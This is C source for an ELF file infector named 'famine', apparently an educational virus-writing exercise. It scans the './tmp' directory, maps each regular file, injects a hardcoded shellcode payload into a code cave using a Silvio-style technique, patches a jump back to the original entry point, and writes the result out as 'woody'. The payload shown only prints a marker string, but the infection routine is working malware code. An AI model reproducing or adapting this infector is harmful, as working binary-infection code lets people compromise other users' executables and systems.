#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <fcntl.h>
#include "famine.h"
#include <elf.h>
#include <sys/syscall.h>
#include "map.h"
#include "utils.h"
#include "silvio.h"

#include <sys/types.h>
#ifndef NULL
#define NULL ((void *)0)
#endif

#define JMP_OFFSET 4

char	g_payload[] = "\x52\xeb\x0f\x2e\x2e\x2e\x2e\x57\x4f\x4f\x44\x59\x2e\x2e\x2e\x2e\x0a\x00\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35\xe0\xff\xff\xff\xba\x0f\x00\x00\x00\x0f\x05\x5a\xe9\xd0\xff\xff\xff";
size_t	g_payload_size	= sizeof(g_payload) - 1;

extern void _start();
extern void end();

// utils
struct linux_dirent64 {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

int	patch_new_file(t_data *data) {

	char woody[] = "woody";

	int fd = _syscall(SYS_open, woody, O_CREAT | O_WRONLY | O_TRUNC, 0755);
	if (fd == -1)
		return 1;

	if (_syscall(SYS_write, fd, data->file, data->size) == -1) {
		_syscall(SYS_close, fd);
		return 1;
	}


	_syscall(SYS_close, fd);

	return 0;
}

int	calculate_jmp(t_data *data, size_t payload_size) {

		data->cave.rel_jmp =  \
		(int64_t)data->cave.old_entry - \
		((int64_t)data->cave.addr + (int64_t)payload_size);

	return 0;
}

char *text_section(t_data *data) {
	Elf64_Shdr *shdr = data->elf.shdr;
	Elf64_Ehdr *ehdr = data->elf.ehdr;

	for (int i = 0; i < ehdr->e_shnum; i++) {
		if (shdr[i].sh_type == SHT_PROGBITS && shdr[i].sh_flags == (SHF_ALLOC | SHF_EXECINSTR)) {

			char *map = (char *)_syscall(SYS_mmap, NULL, shdr[i].sh_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
			if (map == MAP_FAILED)
				return NULL;
			ft_memcpy(map, data->file + shdr[i].sh_offset, shdr[i].sh_size);
			return map;
			//return (char *)(data->file + shdr[i].sh_offset);
		}
	}
	return NULL;
}
	

int	inject(t_data *data) {

	//char *text = text_section(data);

	silvio(data, g_payload_size);

	calculate_jmp(data, g_payload_size);

	modify_payload(data->cave.rel_jmp, JMP_OFFSET, sizeof(data->cave.rel_jmp), (uint8_t *)g_payload, g_payload_size);

	ft_memcpy(data->file + data->cave.offset, g_payload, g_payload_size);

	patch_new_file(data);

	return 0;
}

int	infect(const char *filename)
{
	size_t size = 0;
	uint8_t *file = map_file(filename, &size);
	if (!file) {
		return 1;
	}

	t_data data;
	init_data(&data, file, size);

	inject(&data);

	free_data(&data);
	return 0;
}

void	open_file(char *file)
{
	int fd = _syscall(SYS_open, file, O_RDONLY);
	if (fd < 0)
		return ;

	char buf[PATH_MAX];
	struct linux_dirent64 *dir;
	ssize_t ret;

	for(;;)
	{
		ret = _syscall(SYS_getdents64, fd, buf, PATH_MAX);
		if (ret <= 0)
			break;
		for (size_t i = 0; i < ret; i += dir->d_reclen)
		{
			dir = (struct linux_dirent64 *)(buf + i);

			if (dir->d_name[0] == '.'
					&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
				continue;
			
			if (dir->d_type == DT_REG) {
				char new_path[PATH_MAX];
				make_path(new_path, file, dir->d_name);
				_syscall(SYS_write, 1, new_path, ft_strlen(new_path));
				infect(new_path);
			}
		}
	}

	_syscall(SYS_close, fd);

}



void	famine(void)
{

	char p1[] = "./tmp";
	char *paths[] = {
		p1,
		(void *)0,
	};

	for (int i = 0; paths[i]; i++)
		open_file(paths[i]);

	char tmp[] = "yolo";
	_syscall(SYS_write, 1, tmp, ft_strlen(tmp));


	unsigned long size =  (char *)&end - (char *)&_start;

}
